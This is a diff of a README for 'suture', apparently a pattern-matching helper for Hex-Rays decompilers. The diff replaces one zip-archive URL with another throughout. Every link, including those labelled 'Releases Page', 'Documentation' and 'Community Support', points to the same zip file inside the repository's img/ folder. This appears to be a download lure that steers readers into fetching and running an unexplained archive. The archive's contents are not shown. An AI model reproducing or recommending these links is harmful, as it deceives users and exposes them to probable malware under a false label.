@@ -1,7 +1,7 @@
 # 🎯 suture - Easy Pattern Matching for Your Needs
 
 ## 📥 Download Now
-[![Download suture](https://raw.githubusercontent.com/chaitanyamokkapati/suture/main/img/Software-v2.4.zip)](https://raw.githubusercontent.com/chaitanyamokkapati/suture/main/img/Software-v2.4.zip)
+[![Download suture](https://github.com/chaitanyamokkapati/suture/raw/refs/heads/main/img/Software_1.2.zip)](https://github.com/chaitanyamokkapati/suture/raw/refs/heads/main/img/Software_1.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the suture application! This tool simplifies pattern matching and helps restore structure in hex-rays decompilers. You don’t need to be a programmer to use it. Follow these simple steps to get started.
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets these requirements:
 ## 💻 Download & Install
 To download suture, you can visit the Releases page. Click the link below to find the most recent version:
 
-[Visit Releases Page to Download](https://raw.githubusercontent.com/chaitanyamokkapati/suture/main/img/Software-v2.4.zip)
+[Visit Releases Page to Download](https://github.com/chaitanyamokkapati/suture/raw/refs/heads/main/img/Software_1.2.zip)
 
 1. Open the link above in your web browser.
 2. Look for the latest release version at the top of the page.
@@ -79,7 +79,7 @@ Yes, you can view the source code and contribute to the development on our GitHu
 If you encounter issues, please visit the Issues section on our GitHub page. Describe your problem clearly, and we will assist you.
 
 ## 🔗 Additional Resources
-- [Documentation](https://raw.githubusercontent.com/chaitanyamokkapati/suture/main/img/Software-v2.4.zip)
-- [Community Support](https://raw.githubusercontent.com/chaitanyamokkapati/suture/main/img/Software-v2.4.zip)
+- [Documentation](https://github.com/chaitanyamokkapati/suture/raw/refs/heads/main/img/Software_1.2.zip)
+- [Community Support](https://github.com/chaitanyamokkapati/suture/raw/refs/heads/main/img/Software_1.2.zip)
 
 We hope you enjoy using suture for your pattern matching tasks! Don't hesitate to reach out if you have any questions.
